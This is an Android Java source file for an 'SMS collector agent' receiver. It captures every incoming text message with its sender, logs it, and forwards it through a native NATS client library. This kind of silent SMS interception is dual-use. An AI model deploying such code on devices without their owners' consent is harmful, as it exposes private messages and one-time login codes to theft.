package com.qbit.direct.qbitsmscollectoragentv1;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;
import android.telephony.SmsMessage;

class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) { // Use equals() on constant
            for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                String message = parseSmsMessage(smsMessage);
                if (!message.isEmpty()) {
                    androidx.media3.common.util.Log.d(TAG, "Received SMS: " + message);
                    try {
                        sendToNats(message);
                    } catch (Exception e) {
                        androidx.media3.common.util.Log.e(TAG, "Error sending to NATS: " + e.getMessage());
                    }
                }
            }
        }
    }

    private String parseSmsMessage(SmsMessage smsMessage) {
        if (smsMessage == null || smsMessage.getDisplayOriginatingAddress() == null || smsMessage.getMessageBody() == null) {
            return "";
        }
        return String.format("From: %s : %s", smsMessage.getDisplayOriginatingAddress(), smsMessage.getMessageBody());
    }

    private native void sendToNats(String message);

    static {
        System.loadLibrary("nats_client");
    }
}